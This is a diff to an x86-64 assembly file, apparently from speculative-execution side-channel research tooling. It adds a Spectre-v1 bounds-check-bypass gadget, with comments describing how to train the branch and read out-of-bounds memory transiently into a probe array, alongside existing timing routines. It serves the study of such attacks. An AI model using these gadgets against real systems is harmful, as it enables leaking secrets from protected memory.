@@ -1,6 +1,6 @@
 section .note.GNU-stack noalloc noexec nowrite progbits
 section .text
-    global add, spec_ret_gadget, spec_ret_gadget_burst, spec_ret_store_gadget, spec_read_gadget, time_memory_load, time_memory_load_rdpru, time_memory_load_rdpru_aperf
+    global add, spec_ret_gadget, spec_ret_gadget_burst, spec_ret_store_gadget, spec_read_gadget, spec_branch_read_gadget, time_memory_load, time_memory_load_rdpru, time_memory_load_rdpru_aperf
 
 add:
     mov rax, rdi
@@ -83,6 +83,25 @@ read_mispredict_return:
     lfence
     ret
 read_end:
+    ret
+
+; void spec_branch_read_gadget(size_t idx, size_t *bound_ptr,
+;                              unsigned char *base, void *probe_array)
+; rdi = idx
+; rsi = bound_ptr
+; rdx = base
+; rcx = probe_array
+; Architecturally, the load+encode only happens when idx < *bound_ptr.
+; The caller trains the branch with in-bounds indices, then flushes bound_ptr
+; and issues an out-of-bounds idx so the body may execute transiently.
+spec_branch_read_gadget:
+    mov r8, [rsi]
+    cmp rdi, r8
+    jae branch_read_done
+    movzx r9, byte [rdx + rdi]
+    shl r9, 12
+    mov r10, [rcx + r9]
+branch_read_done:
     ret
 
 time_memory_load:
